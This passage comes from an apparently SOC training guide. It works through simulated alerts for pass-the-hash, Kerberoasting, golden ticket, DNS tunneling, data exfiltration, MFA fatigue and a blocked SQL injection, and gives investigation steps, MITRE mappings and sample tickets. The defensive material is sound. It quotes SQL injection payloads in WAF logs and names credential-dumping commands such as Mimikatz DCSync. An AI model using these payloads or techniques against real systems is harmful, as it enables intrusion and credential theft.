DETECTION: SIEM rule "Admin share access from isolated host" (correlated)
TIMESTAMP: 2024-01-15 03:05 UTC (30 min after initial WKS-0231 compromise)
AFFECTED USER: svc-finance (DANGER: admin on DC)
AFFECTED HOST: DC01 (Domain Controller) - escalated from WKS-0231
IOC: svc-finance, new user "tempadmin", cmd.exe on DC01
EVIDENCE: 4624 Type3, 5140 (C$), 4688 (cmd on DC), 4720+4728 (admin user 
          created), Sysmon 10 (lsass access on WKS-0231)
FINDINGS: CRITICAL - Domain controller compromised via over-privileged 
          service account. Admin user created. Assume domain compromise.
MITRE: T1021.002, T1078.001, T1003.001, T1098
SEVERITY: CRITICAL
RECOMMENDED ACTION: DISABLE svc-finance NOW, isolate DC01 network, 
                    kill new admin user, check golden ticket (krbtgt reset), 
                    full domain credential rotation, emergency IR
ESCALATION: CRITICAL - L3, CISO, Management, external IR
```

---

## Case 11: Pass-the-Hash

### Alert
```
Alert: "NTLM logon with suspicious hash reuse"
Host: WKS-0345
Target: FS01
User: DOMAIN\m.reed
Type: NTLM (EventID 4624 LogonType 3, with NtLmSsp)
Suspicious: m.reed's workstation is WKS-0098, but NTLM auth came from WKS-0345
Time: 02:47:33 UTC
```

### Initial Evidence
```
02:47:33  EventID 4624  Type=3  User=DOMAIN\m.reed  Source=WKS-0345  AuthPackage=NTLM
02:47:33  EventID 4624  Type=3  User=DOMAIN\m.reed  Source=WKS-0345  AuthPackage=NTLM
         (repeated across multiple servers)
02:48:00  EventID 4688  Source=WKS-0345  Process=cmd.exe /c net use \\FS01\share
```

### Investigation Steps
1. **Verify user's real workstation**: m.reed normally logs in at WKS-0098. Auth from WKS-0345 = anomaly
2. **Check the source host**: WKS-0345 — whose is it? Any prior alerts?
3. **Check NTLM auth**: NTLM over network from a different host = classic PtH pattern
4. **Check which servers**: Multiple NTLM auth events from WKS-0345 across servers = rapid SMB access
5. **Check target access**: What did attacker access on FS01?
6. **Check the source host for compromise**: Sysmon 10 (ProcessAccess/lsass), Mimikatz, credential dumping

### Questions
1. Why is m.reed's NTLM auth originating from WKS-0345 when he's at WKS-0098?
2. Was there credential dumping on WKS-0098? (Mimikatz in memory?)
3. Does WKS-0345 have prior alerts? (Compromised host?)
4. What was the cmd.exe command doing?

### Expected Findings
- **True Positive**: Pass-the-Hash. WKS-0345 was compromised (via phishing 2h prior), attacker dumped hashes from WKS-0345's memory OR used m.reed's hash
- **Actually**: Attacker on WKS-0345 (via RDP) executed Mimikatz, dumped m.reed's NTLM hash from lsass (m.reed had connected to WKS-0345 earlier)
- **Used the hash** to access FS01 (NTLM auth from WKS-0345 = PtH)
- **NTLM restriction missing**: NTLM allowed across domain (LAPS + NTLM blocking would have prevented)

### Severity & Escalation
- **Severity: HIGH** (approaching CRITICAL if admin hash used)
- **Escalation: YES to L2**: isolate WKS-0345, reset m.reed password (hash invalidated), block NTLM if possible, hunt for hash reuse, investigate WKS-0098

### MITRE ATT&CK
- T1550.002 Pass the Hash
- T1003.001 LSASS Memory
- T1021.002 SMB/Windows Admin Shares
- T1078 Valid Accounts

### Example SOC Ticket
```
SUMMARY: Pass-the-Hash from compromised WKS-0345
DETECTION: SIEM rule "NTLM auth from unexpected source host"
TIMESTAMP: 2024-01-15 02:47 UTC
AFFECTED USER: m.reed (hash stolen), attacker on WKS-0345
AFFECTED HOST: WKS-0345 (source), WKS-0098 (hash origin), FS01 (target)
IOC: WKS-0345, NTLM hash of m.reed, mimikatz activity
EVIDENCE: NTLM 4624 from WKS-0345 (not m.reed's host), Sysmon 10 lsass 
          access, mimikatz on WKS-0345, cmd net use to FS01, 
          phishing 2h prior on WKS-0345
FINDINGS: PtH - attacker dumped m.reed hash via Mimikatz, used over NTLM. 
          NTLM network access permitted. FS01 accessed.
MITRE: T1550.002, T1003.001, T1021.002
SEVERITY: HIGH
RECOMMENDED ACTION: Isolate WKS-0345, reset m.reed password (all hashes 
                    invalid), restrict NTLM, hunt for hash reuse, 
                    enable Windows LAPS
ESCALATION: L2 IR
```

---

## Case 12: Kerberoasting

### Alert
```
Alert: "Unusual Kerberos TGS requests (SPN enumeration)"
Source: WKS-0210
User: j.doe (standard user)
Target: Multiple service accounts (SPNs)
Time: 23:15 - 23:20 UTC
Count: 85 TGS requests for service accounts in 5 minutes
```

### Initial Evidence
```
23:15:10  EventID 4769  User=j.doe  Service=svc-sql/corp.local:1433  TicketOptions=0x40810000
23:15:12  EventID 4769  User=j.doe  Service=svc-web/corp.local:80
23:15:14  EventID 4769  User=j.doe  Service=svc-backup/corp.local
... 85 total TGS requests to service accounts over 5 minutes
Note: 4769 requests are for SERVICE accounts (SPN), not regular users
```

### Investigation Steps
1. **Identify the pattern**: 85 TGS requests for service accounts in 5 min = Kerberoasting (requesting service tickets to offline crack)
2. **Check the user**: j.doe is a standard user — no legitimate need to request tickets for service accounts
3. **Check ticket encryption type**: `TicketEncryptionType=0x17` (RC4) = weaker encryption = crackable offline
4. **Check if service accounts use weak passwords**: svc-sql password = `SqlServer2023!` (weak)
5. **Check what tools**: EventID 4768 (TGT) + 4769 (TGS) pattern = Rubeus/Invoke-Kerberoast
6. **Check for offline cracking**: Can't see from logs, but assume attacker cracks offline
7. **Check source host**: WKS-0210 — standard user, prior alerts?

### Questions
1. Why would j.doe request tickets for 85 service accounts?
2. What encryption were the tickets? (RC4 = crackable)
3. Are the service account passwords strong? (LAPS/Long complex?)
4. Could this be automated legitimate? (No — 85 SPNs is not legitimate)

### Expected Findings
- **True Positive**: Kerberoasting. j.doe account compromised (phishing 1 day prior)
- **Tickets requested**: RC4 encrypted (crackable)
- **svc-sql password cracked offline**: `SqlServer2023!` — attacker now has service account credentials
- **svc-sql has domain admin rights** (misconfigured) → escalation path to domain compromise

### Severity & Escalation
- **Severity: HIGH** (would be CRITICAL if service account is privileged)
- **Escalation: YES to L2**: reset svc-sql password (and all weak SPNs), require AES encryption, disable RC4, isolate WKS-0210, reset j.doe credentials

### MITRE ATT&CK
- T1558.003 Kerberoasting
- T1078 Valid Accounts (j.doe compromise)
- T1110.002 Password Cracking (offline)

### Example SOC Ticket
```
SUMMARY: Kerberoasting - mass TGS requests for service accounts
DETECTION: SIEM rule "Unusual volume of TGS requests"
TIMESTAMP: 2024-01-15 23:15-23:20 UTC
AFFECTED USER: j.doe (compromised), svc-sql (at risk), svc-web, svc-backup
AFFECTED HOST: WKS-0210 (source), DCs (target)
IOC: j.doe, svc-sql/corp.local:1433, 85 TGS requests, RC4 tickets
EVIDENCE: 85x 4769 for SPNs, RC4 encryption, j.doe phishing 1d prior, 
          svc-sql weak password, svc-sql in Server Admins group
FINDINGS: Kerberoasting. svc-sql password weak + privileged = HIGH risk. 
          Assume offline cracking. Privilege escalation risk.
MITRE: T1558.003, T1078, T1110.002
SEVERITY: HIGH
RECOMMENDED ACTION: Reset svc-sql + all weak SPN passwords, disable RC4 
                    (AES only), isolate WKS-0210, reset j.doe, 
                    review service account permissions
ESCALATION: L2 + Identity team
```

---

## Case 13: Golden Ticket

### Alert
```
Alert: "Suspicious TGT request for krbtgt with unusual SID history"
DC: DC01
Event: EventID 4768 (TGT request) for user "Administrator" 
       BUT: SID history contains enterprise SIDs + 20-year validity
       TicketOptions=0x40810010 (Forwardable, Renewable, etc.)
Time: 04:50:00 UTC
```

### Initial Evidence
```
04:50:00  EventID 4768  User=Administrator  Service=krbtgt  TicketOptions=0x40810010  
          ClientAddress=WKS-0345  (note: Administrator usually logs in at console)
          AdditionalInfo: SID History contains: S-1-5-21-...-519 (Domain Admins) + 
                          S-1-5-21-...(foreign domain)
          TicketValidTo: 20 years in the future
```

### Key Golden Ticket Indicators
| Indicator | Normal | Golden Ticket |
|-----------|--------|---------------|
| **TGT lifetime** | 10 hours (default) | Years (arbitrary) |
| **SID History** | User's SID only | Multiple elevated SIDs injected |
| **User** | Real user context | Forged user (Administrator) |
| **Source** | User's host | Any host |
| **Encryption** | Normal | Can be unusual |
| **Decryption** | KDC knows key | **Forged with stolen krbtgt hash** |

### Investigation Steps
1. **Verify the TGT details**: Lifetime (20 years = forged), SID history (elevated = forged)
2. **Check source host**: WKS-0345 — was this the PtH host from Case 11?!
3. **Check krbtgt compromise**: Was krbtgt hash dumped? (EventID 4769/4768 with unusual patterns, lsass dumps, DC compromise earlier?)
4. **Check the DC access**: Did attacker get domain admin/DC access to dump krbtgt? (Mimikatz `lsadump::dcsync`)
5. **Check for other golden ticket usage**: Multiple hosts showing Administrator logins simultaneously
6. **Check DC replication events**: 4662 (Dir Access) for krbtgt secrets

### Questions
1. Has the krbtgt password EVER been reset? (If never, hash is old and valid)
2. When did the attacker compromise a DC? (Correlate with earlier incidents)
3. Are there other forged tickets in use? (Logons from unusual hosts)
4. What is the full SID history? (Foreign domain = forest trust compromise?)

### Expected Findings
- **True Positive**: Golden Ticket. Attacker had previously compromised DC (DCSync via svc-finance abuse from Case 10!) and dumped krbtgt hash
- **20-year TGT** with Domain Admins SID = full domain control
- **Attacker logged into multiple hosts** simultaneously as "Administrator" (from WKS-0345, WKS-0231, FS01)
- **krbtgt password never rotated** (organizational finding)

### Severity & Escalation
- **Severity: CRITICAL** — Golden ticket = full domain compromise
- **Escalation: CRITICAL IMMEDIATE**: CISO, external IR. Requires: (1) reset krbtgt TWICE (standard), (2) rebuild DCs if needed, (3) rotate ALL credentials, (4) remove attacker persistence, (5) full domain hunt

### MITRE ATT&CK
- T1558.001 Golden Ticket
- T1003.006 DCSync (krbtgt hash theft)
- T1078 Valid Accounts

### Example SOC Ticket
```
SUMMARY: Golden Ticket detected - full domain compromise
DETECTION: SIEM rule "Unusual TGT lifetime + SID history"
TIMESTAMP: 2024-01-15 04:50 UTC (ticket forged earlier)
AFFECTED USER: Administrator (forged), DOMAIN (all)
AFFECTED HOST: DC01, all domain hosts (potential)
IOC: krbtgt hash (stolen), forged TGT, SID S-1-5-21-...-519
EVIDENCE: 20yr TGT, SID history injection, krbtgt never rotated, 
          DCSync via svc-finance compromise (Case 10), logons from 
          multiple hosts as Administrator
FINDINGS: CRITICAL - Golden Ticket. krbtgt hash stolen via DC compromise. 
          Attacker has persistent domain-wide access.
MITRE: T1558.001, T1003.006
SEVERITY: CRITICAL
RECOMMENDED ACTION: EMERGENCY - reset krbtgt x2, rebuild/verify DCs, 
                    rotate all admin/service credentials, remove 
                    persistence, full domain compromise assessment, 
                    external IR engagement
ESCALATION: CRITICAL - CISO, external IR, regulatory notification
```

---

## Case 14: DNS Tunneling

### Alert
```
Alert: "DNS tunneling detected - high volume TXT record queries"
Host: WKS-0789
Domain: update-tunnel.xyz
Query Type: TXT, CNAME, MX (unusual for updates)
Volume: 4,500 queries in 2 hours
Payload: Encoded data in subdomains
```

### Initial Evidence
```
11:00:05  DNS Query: ngea3.m2cmjfe4.update-tunnel.xyz  TXT
11:00:06  DNS Query: qzm81.klj3nbz2.update-tunnel.xyz  TXT
11:00:08  DNS Query: a2nc9.83fhhwue.update-tunnel.xyz  TXT
... (4,500 similar queries, unique subdomains, base64-looking payload)
Size: Each subdomain ~50-60 chars (near 255 limit per query)
Rate: ~37 queries/minute sustained
```

### Investigation Steps
1. **Identify the pattern**: High-volume TXT queries to a single domain, base64-looking subdomains = DNS tunneling
2. **Check the domain**: update-tunnel.xyz — WHOIS (3 days old), reputation
3. **Check the process**: What process made these queries? (EDR DNS events or Sysmon 22)
4. **Check the response**: TXT responses contain data (C2 output / exfil payload)
5. **Check the query type mix**: Real updates use A/AAAA/CNAME; TXT with encoded data = tunnel
6. **Check data volume**: 4,500 queries x 60 bytes = ~270KB — small but persistent exfil/C2 channel
7. **Check other hosts**: Same domain queried elsewhere?

### Questions
1. Why does a workstation query TXT records for "update-tunnel.xyz"?
2. What is in the subdomain payloads? (Base64 → decode → often C2 commands or stolen data)
3. Does the org normally allow external DNS? (Split DNS? DNS proxy?)
4. Is this C2, exfiltration, or both?

### Expected Findings
- **True Positive**: DNS tunneling. Process = `svchost.exe` (via injected DLL) or `wermgr.exe` masquerade
- **C2 channel**: Attacker using iodine/DNSCat2 over DNS (bypasses egress filtering since DNS allowed)
- **Exfil data**: Query subdomains contained HTTP POST data (session tokens, small files)
- **Correlation**: Host also had C2 beaconing via HTTPS (dual-channel)

### Severity & Escalation
- **Severity: HIGH** — active data exfil/C2 via DNS
- **Escalation: YES to L2**: isolate host, block update-tunnel.xyz at DNS, block DNS to external for this host, kill process, investigate exfil data scope

### MITRE ATT&CK
- T1048.003 Exfiltration Over Alternative Protocol (DNS)
- T1071.004 Application Layer Protocol: DNS
- T1008 Fallback Channels (DNS as backup C2)
- T1041 Exfiltration Over C2 Channel

### Example SOC Ticket
```
SUMMARY: DNS tunneling - C2/exfil over DNS queries
DETECTION: NDR/DNS rule "High volume TXT queries single domain"
TIMESTAMP: 2024-01-15 11:00-13:00 UTC
AFFECTED USER: Unknown process (injected svchost), host WKS-0789
AFFECTED HOST: WKS-0789
IOC: update-tunnel.xyz, base64 subdomains, TXT query pattern
EVIDENCE: 4,500 TXT queries, ~60-char base64 subdomains, 37/min rate, 
          domain 3 days old, data in TXT responses
FINDINGS: DNS tunneling (iodine/DNACat2). C2 + potential exfil. 
          Bypasses egress controls since DNS is allowed.
MITRE: T1071.004, T1048.003
SEVERITY: HIGH
RECOMMENDED ACTION: Isolate host, block domain at DNS + firewall, 
                    enable DNS logging, terminate process, 
                    decode payloads for exfil scope
ESCALATION: L2 IR
```

---

## Case 15: Data Exfiltration

### Alert
```
Alert: "Large outbound data transfer detected"
Host: WKS-0899 (Finance - already compromised in Case 9)
Process: explorer.exe
Destination: 203.0.113.200:443
Volume: 1.2 GB outbound in 15 minutes
Time: 02:00 - 02:15 UTC
```

### Initial Evidence
```
02:00:15  explorer.exe → 203.0.113.200:443 (connection, 5 MB)
02:02:30  explorer.exe → 203.0.113.200:443 (12 MB)
02:05:00  explorer.exe → 203.0.113.200:443 (25 MB)
02:08:20  explorer.exe → 203.0.113.200:443 (40 MB)
02:11:45  explorer.exe → 203.0.113.200:443 (60 MB)
... Total 1.2 GB outbound in 15 min (unusual for a workstation)
```

### Investigation Steps
1. **Verify the anomaly**: 1.2 GB outbound from a workstation in 15 min = massive. Normal = <50 MB/hour
2. **Check process**: explorer.exe making HTTPS calls? (Explorer can do HTTP, but 1.2 GB is anomalous)
3. **Check source files**: What files were read/accessed just before? (EDR file events)
4. **Check destination**: 203.0.113.200 (test IP!) — reputation, geo
5. **Check the connection**: TLS to non-standard? JA3? Long-lived?
6. **Check for compression**: Did attacker zip files first? (7z/WinRAR events)
7. **Check what data**: Sensitive? PII? Financial reports? (Finance host!)
8. **CORRELATE**: This is the same host compromised via RDP in Case 9!

### Questions
1. What sensitive data lives on/accessible from this host?
2. Why is explorer.exe uploading 1.2 GB?
3. Did the attacker stage files before upload? (Compression artifacts)
4. Is this the same attacker from the RDP compromise?

### Expected Findings
- **True Positive**: Data exfiltration. Same attacker from Case 9 (RDP compromise)
- **Staging**: Attacker compressed Finance folder (customer PII, financial records) to `C:\Users\r.jones\AppData\Roaming\backup.7z`
- **Destination**: Attacker-controlled server (VPS), encrypted TLS (no visibility)
- **SRUM/EDR network stats**: Confirm 1.2 GB from explorer.exe → 203.0.113.200

### Severity & Escalation
- **Severity: CRITICAL** — confirmed data exfiltration (PII, financial)
- **Escalation: CRITICAL**: L2/L3, Legal (PII breach notification), Compliance (GDPR 72h), Management. Forensic preservation of exfil data scope.

### MITRE ATT&CK
- T1048.003 Exfiltration Over Alternative Protocol (HTTPS)
- T1560.001 Archive Collected Data (compression)
- T1005 Data from Local System
- T1030 Data Transfer Size Limits (bypass)

### Example SOC Ticket
```
SUMMARY: Data exfiltration (1.2GB PII) from compromised Finance host
DETECTION: NDR rule "Large outbound transfer - workstation"
TIMESTAMP: 2024-01-15 02:00-02:15 UTC
AFFECTED USER: r.jones (compromised in Case 9)
AFFECTED HOST: WKS-0899
IOC: 203.0.113.200:443, backup.7z (staging archive)
EVIDENCE: 1.2GB explorer.exe→203.0.113.200:443, 7z compression, 
          access to Finance folder (PII), same attacker as RDP compromise
FINDINGS: CRITICAL - PII/financial data exfiltrated. Legal + regulatory 
          impact. Preserve evidence of exfil scope.
MITRE: T1048.003, T1560.001, T1005
SEVERITY: CRITICAL
RECOMMENDED ACTION: Isolate host, block destination, preserve staging 
                    archive + network captures, quantify exfil data, 
                    legal/compliance notification, full investigation
ESCALATION: CRITICAL - Legal, Compliance, Management
```

---

## Case 16: Suspicious Privileged Account Activity

### Alert
```
Alert: "Privileged account using non-standard protocol"
User: DOMAIN\svc-backup (Backup Operators)
Host: WKS-0211 (User workstation, NOT a server)
Events: Interactive logon (Type 2) as svc-backup + PowerShell + RDP
Time: 14:30 - 15:00 UTC
```

### Initial Evidence
```
14:30:15  EventID 4624  Type=2 (Interactive)  User=svc-backup  Host=WKS-0211
14:30:20  EventID 4688  Host=WKS-0211  Process=powershell.exe  User=svc-backup
14:31:00  EventID 4624  Type=10 (RemoteInteractive)  User=svc-backup  Host=WKS-0211
14:31:30  EventID 4688  Host=WKS-0211  Process=cmd.exe /c whoami && net user
14:32:00  EventID 4688  Host=WKS-0211  Process=net localgroup administrators
```

### Investigation Steps
1. **Verify account purpose**: svc-backup is a Backup Operators service account — should run as a SERVICE on backup servers, NOT interactive logon on a workstation
2. **Check the host**: WKS-0211 is a user's workstation (not backup server) — wrong host for this account
3. **Check the actions**: PowerShell + cmd + net user + net localgroup = reconnaissance
4. **Check the user**: Who normally uses WKS-0211? (j.doe from Case 12!)
5. **Check what it accessed**: Did svc-backup access other systems? (Backup account = can read everything!)
6. **Check for credential theft**: Did this lead to more? (svc-backup has Backup Operators = read all files + shadow copy access)

### Questions
1. Why does a backup service account log in interactively?
2. Why on a user workstation?
3. Why is it enumerating users/groups (recon)?
4. Does svc-backup have access to sensitive data? (Backup = yes, full read access!)

### Expected Findings
- **True Positive**: Privileged account abuse. svc-backup credentials compromised (stolen via PtH/kerberoast earlier)
- **Attack chain**: svc-backup (Backup Operators) → can dump NTDS.dit (SAM) or access shadow copies → DCSync-like capability
- **Recon**: `net user`, `net localgroup` = mapping privilege targets
- **This may be the precursor to the Golden Ticket (Case 13)** — svc-backup access to NTDS.dit on DC!

### Severity & Escalation
- **Severity: CRITICAL** (privileged account + backup = data access + domain compromise potential)
- **Escalation: CRITICAL IMMEDIATE**: disable svc-backup, isolate WKS-0211, reset ALL credentials svc-backup could access, hunt for NTDS.dit theft, correlate with Case 13

### MITRE ATT&CK
- T1078.001 Valid Accounts (privileged account abuse)
- T1087 Account Discovery (net user)
- T1069 Permission Groups Discovery
- T1003.003 NTDS (potential credential theft)
- T1543.003 Windows Service (backup account normal usage)

### Example SOC Ticket
```
SUMMARY: Privileged backup account used interactively on workstation
DETECTION: SIEM rule "Service account interactive logon"
TIMESTAMP: 2024-01-15 14:30-15:00 UTC
AFFECTED USER: svc-backup (Backup Operators - privileged)
AFFECTED HOST: WKS-0211 (user workstation, j.doe's)
IOC: svc-backup, WKS-0211
EVIDENCE: Interactive + RDP logon as svc-backup, recon commands, 
          j.doe's workstation (already compromised), Backup Operators 
          = NTDS.dit / shadow copy access
FINDINGS: Privileged account abuse. Backup account can read all + 
          NTDS.dit. Likely path to domain compromise (correlate Case 13).
MITRE: T1078.001, T1087, T1003.003
SEVERITY: CRITICAL
RECOMMENDED ACTION: Disable svc-backup, isolate WKS-0211, rotate backup 
                    account, check for NTDS.dit theft, hunt for 
                    privileged account use elsewhere
ESCALATION: CRITICAL - L3 + CISO
```

---

## Case 17: Impossible Travel

### Alert
```
Alert: "Impossible travel - logon from two distant locations"
User: h.grant (Finance Director - privileged)
Location 1: New York, USA (10:00 UTC, corporate office)
Location 2: Hong Kong (11:30 UTC, 90 minutes later)
Time: Alert at 11:35 UTC
```

### Initial Evidence
```
10:00:02  Entra ID Sign-in: h.grant@corp.com, IP 203.0.113.10 (New York, NY, USA)
          Authentication: Password + MFA (push accepted)
          Device: hgrant-laptop (compliant, Intune)
          App: Outlook Web (Office 365)
11:30:15  Entra ID Sign-in: h.grant@corp.com, IP 198.51.100.77 (Hong Kong)
          Authentication: Password + MFA (push accepted)
          Device: hgrant-laptop (compliant, Intune)
          App: SharePoint Online
```

### Investigation Steps
1. **Verify the time/distance**: NY → HK in 90 min = impossible (flight ~15 hours)
2. **Check MFA**: BOTH logins had MFA push accepted! How? (MFA fatigue? Push notification accepted twice?)
3. **Check the device**: Same laptop in both locations? (Check device IP, VPN)
4. **Check VPN**: Was corporate VPN used? (IP should be corporate gateway, not public)
5. **Check for MFA bypass**: Recent MFA enrollments? (Attacker added own MFA?)
6. **Check user's actual location**: Was h.grant in the office at 10:00? (Badge access, workstation activity)
7. **Check sign-in risk flags**: Entra ID Risk Detection status (Unfamiliar location, impossible travel risk)

### Questions
1. How were BOTH MFA pushes accepted?
2. Is the "same device" real or is the device token compromised?
3. Did h.grant acknowledge receiving MFA prompts?
4. What did the HK session access? (SharePoint = data access)

### Expected Findings
- **True Positive**: Impossible travel = account compromise (MFA fatigue attack)
- **MFA bypass**: Attacker bombarded h.grant with MFA push prompts; user accepted during the confusion (MFA fatigue). Second login from HK was the attacker.
- **Session activity**: HK session accessed SharePoint Finance folders (budget documents, board reports)
- **Persistence**: Attacker registered new MFA method (Authenticator app) during HK session (check audit logs)

### Severity & Escalation
- **Severity: CRITICAL** — Finance Director account compromised, MFA bypassed
- **Escalation: CRITICAL IMMEDIATE**: revoke sessions, reset password, remove attacker MFA method, re-enroll MFA, block HK IP, enable number-matching MFA, review SharePoint access

### MITRE ATT&CK
- T1078.004 Valid Accounts: Cloud Accounts
- T1621 Multi-Factor Authentication Request Generation (MFA fatigue)
- T1110.001 Brute Force (credential stuffing for password)
- T1530 Data from Cloud Storage (SharePoint access)

### Example SOC Ticket
```
SUMMARY: Impossible travel + MFA fatigue - Finance Director compromise
DETECTION: Entra ID "Impossible travel" risk detection
TIMESTAMP: 2024-01-15 10:00 (legit) / 11:30 (attack) UTC
AFFECTED USER: h.grant (Finance Director - PRIVILEGED)
AFFECTED HOST: hgrant-laptop (device token), cloud apps
IOC: 198.51.100.77 (HK), attacker MFA method, h.grant@corp.com
EVIDENCE: NY→HK in 90min (impossible), both MFA pushes accepted (fatigue), 
          attacker added MFA method, SharePoint Finance accessed, 
          risk detection flagged impossible travel
FINDINGS: Account compromise via MFA fatigue. Attacker accessed 
          Finance data. MFA method added = persistence.
MITRE: T1078.004, T1621, T1530
SEVERITY: CRITICAL
RECOMMENDED ACTION: Revoke all sessions, reset password, remove attacker 
                    MFA, re-enroll with number matching, block HK IP, 
                    review SharePoint access, audit MFA changes
ESCALATION: CRITICAL - L3, Identity team, Legal
```

---

## Case 18: Endpoint Compromise (Full Chain)

### Alert
```
Alert: "EDR - Endpoint compromised (multiple detection techniques)"
Host: WKS-0455 (recurring - Case 7 C2 beacon!)
User: a.kumar (recurring)
Time: Chain spanning 8 hours
```

### Full Chain Reconstruction
```
08:00   Email: a.kumar received "invoice.pdf.exe" (phishing attachment)
08:05   Execution: a.kumar ran invoice.pdf.exe (user execution)
08:05   Download: invoice.pdf.exe → downloaded wermgr.exe (masquerade) + update.dll
08:10   Persistence: Run key "Updater" created (HKCU)
08:15   Execution: rundll32 update.dll (Case 6 pattern)
08:30   C2: wermgr.exe beaconing to 203.0.113.88:443 (Case 7)
09:00   Discovery: net user /domain, whoami, ipconfig
09:30   Credential Access: mimikatz → dumped a.kumar's NTLM hash
10:00   Lateral: NTLM auth to FS01 using a.kumar's hash (PtH)
10:30   Exfil: Upload of Finance files (200 MB) to 203.0.113.88
16:00   Detection: C2 beaconing rule fired (Case 7) → incident declared
```

### Investigation Steps (This is a FULL incident)
1. **Start from detection**: C2 beaconing (Case 7) — work backwards
2. **Initial access**: Phishing email (08:00) → user execution (08:05)
3. **Execution → persistence**: Download → Run key (08:10)
4. **Defense evasion**: Masquerading wermgr.exe, rundll32 LOLBin, DLL in AppData
5. **C2**: Beacon to 203.0.113.88:443 (Case 7)
6. **Credential access**: lsass dump / mimikatz (09:30)
7. **Lateral**: PtH to FS01 (10:00)
8. **Exfil**: 200 MB upload (10:30)
9. **Determine FULL SCOPE**: What was accessed, what data exfiltrated

### Expected Findings
- **True Positive**: Full Kill-Chain compromise
- **Initial access**: Spearphishing (invoice.pdf.exe)
- **5 persistence mechanisms**: Run key, scheduled task, service, DLL injection, WMI
- **Data at risk**: Finance folder (shared), a.kumar's mailbox, local files
- **Lateral movement**: FS01 accessed with stolen hash

### Severity & Escalation
- **Severity: CRITICAL** — full chain: phishing → execution → persistence → C2 → credential theft → lateral → exfil
- **Escalation: CRITICAL**: Full IR. All IOCs blocked, hosts isolated, credentials rotated, email reviewed, exfil scope quantified.

### MITRE ATT&CK (Full Chain)
| Phase | Technique |
|-------|-----------|
| Initial Access | T1566.001 Spearphishing Attachment |
| Execution | T1204.002 Malicious File, T1059.003 Cmd, T1059.001 PowerShell |
| Persistence | T1547.001 Run Key, T1053.005 Scheduled Task |
| Defense Evasion | T1036.003 Masquerading, T1218.011 Rundll32 |
| Credential Access | T1003.001 LSASS Memory |
| Discovery | T1087 Account Discovery, T1016 System Network Config |
| Lateral Movement | T1550.002 Pass the Hash, T1021.002 SMB |
| C2 | T1071.001 HTTPS C2 |
| Exfiltration | T1048.003 Exfil over HTTPS |

### Example SOC Ticket
```
SUMMARY: Full kill-chain endpoint compromise (phishing→C2→exfil)
DETECTION: C2 beaconing rule (Case 7) + correlated EDR detections
TIMESTAMP: 2024-01-15 08:00-16:00 UTC
AFFECTED USER: a.kumar
AFFECTED HOST: WKS-0455 (primary), FS01 (lateral)
IOC: invoice.pdf.exe, wermgr.exe (masq), update.dll, 203.0.113.88:443, 
     a.kumar NTLM hash
EVIDENCE: Full chain (8 phases), 5 persistence mechanisms, PtH to FS01, 
          200MB exfil, mimikatz usage
FINDINGS: CRITICAL - Complete attack chain. Credential theft + lateral 
          movement + exfiltration confirmed.
MITRE: Full chain (see table)
SEVERITY: CRITICAL
RECOMMENDED ACTION: Isolate all affected hosts, block IOCs, reset 
                    credentials, remove persistence, quantify exfil, 
                    full IR + legal
ESCALATION: CRITICAL - Full incident response
```

---

## Case 19: Web Attack (SQL Injection)

### Alert
```
Alert: "WAF - SQL Injection blocked"
Target: https://corp.com/portal/login
Source IP: 45.155.205.120
Time: 02:30 - 02:45 UTC
Payload: ' OR 1=1--, UNION SELECT user,password FROM users--
```

### Initial Evidence
```
02:30:11  WAF: SQLi pattern blocked - ' OR 1=1-- at /portal/login
02:31:05  WAF: SQLi pattern blocked - UNION SELECT at /portal/login
02:32:00  WAF: SQLi pattern blocked - AND 1=1 at /portal/search?q=
02:33:30  WAF: Blocked 25 requests, all SQLi patterns
02:34:00  WAF: SQLi to /portal/products?id=1 AND SLEEP(5) (time-based)
02:45:00  WAF: Rate limit triggered (automated tool)
```

### Investigation Steps
1. **Verify WAF blocked**: 100% blocked? Any requests reached the app? (Check WAF log: action=blocked vs allowed)
2. **Check application logs**: Did any SQLi reach the backend? (Correlate app server logs with WAF)
3. **Check the target**: /portal/login, /portal/search, /portal/products — what app? Data?
4. **Check source**: 45.155.205.120 — reputation (scanning ASN), geo
5. **Check for time-based SQLi success**: SLEEP(5) — if app is vulnerable, timing difference proves injection
6. **Check for data exfil**: Any large responses from the app? (WAF/app logs)
7. **Check auth impact**: Login bypass attempts — any successful unusual logins?

### Questions
1. Is the WAF the only defense? (App has parameterized queries? Input validation?)
2. Did the attacker get any data through? (DLL/extraction)
3. What's behind /portal? (Customer data? Internal app?)
4. Was this automated scanning or targeted? (Broad patterns vs specific app knowledge)

### Expected Findings
- **Likely False Positive (for compromise)** — WAF blocked all attempts
- **WAF effectively mitigated**: 100% of SQLi blocked, none reached app
- **App NOT vulnerable**: Parameterized queries confirmed by dev team
- **Attacker**: Automated SQLi scanner (banner/pattern-based), no successful exploit
- **However**: Source IP is known scanner ASN; add to blocklist, monitor for return visits

### Severity & Escalation
- **Severity: LOW-MEDIUM** — no compromise, blocked attack
- **Escalation: NO (L1 closes)** — document as blocked attack, add IP to blocklist, note for trend analysis. Escalate ONLY if WAF misses or app shows signs of compromise.

### MITRE ATT&CK
- T1190 Exploit Public-Facing Application
- T1059.007 SQL (if injection)
- T1041 Exfiltration (if data extracted)

### Example SOC Ticket
```
SUMMARY: SQLi attack blocked by WAF (no compromise)
DETECTION: WAF rule "SQL Injection"
TIMESTAMP: 2024-01-15 02:30-02:45 UTC
AFFECTED HOST: corp.com web server (behind WAF)
SOURCE IP: 45.155.205.120 (scanner ASN, geo=Netherlands)
IOC: 45.155.205.120, SQLi payloads (UNION, SLEEP, OR 1=1)
EVIDENCE: 25 blocked SQLi, 100% WAF coverage, app uses parameterized 
          queries, no app-level compromise, automated tool signature
FINDINGS: Blocked attack (LOW). Automated SQLi scanner. No compromise.
MITRE: T1190
SEVERITY: LOW
RECOMMENDED ACTION: Add IP to blocklist, continue monitoring, confirm 
                    WAF rule coverage, no user impact
ESCALATION: None (closed by L1, trend logged)
```

---

## Case 20: False Positive (The Crucial One)

### Alert
```
Alert: "PowerShell encoded command execution - svchost.exe parent"
Host: WKS-0111
User: SYSTEM
Process: powershell.exe -enc <encoded>
Parent: svchost.exe
Time: 07:00:05 UTC (exactly at system startup)
```

### Initial Evidence
```
07:00:02  EventID 4688  Parent=svchost.exe (Session Manager)  
          Image=powershell.exe
